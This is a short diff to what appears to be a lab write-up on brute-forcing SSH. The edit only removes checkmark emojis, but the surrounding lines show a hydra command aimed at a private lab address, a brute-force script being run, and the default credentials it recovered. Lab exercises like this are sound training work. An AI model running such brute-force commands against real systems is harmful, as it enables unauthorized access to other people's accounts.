@@ -83,7 +83,7 @@ Command used:
 hydra -L user.txt -P pass.txt ssh://192.168.56.103 -t 4
 ```
 
-✅ Result:
+Result:
 
 - Hydra successfully found the credentials:
   - **Username:** `vagrant`
@@ -117,7 +117,7 @@ chmod +x ssh_bruteforce.sh
 ./ssh_bruteforce.sh
 ```
 
-✅ Output confirmed the attack was successful with valid credentials found:
+Output confirmed the attack was successful with valid credentials found:
 
 - **Username:** `vagrant`
 - **Password:** `vagrant`
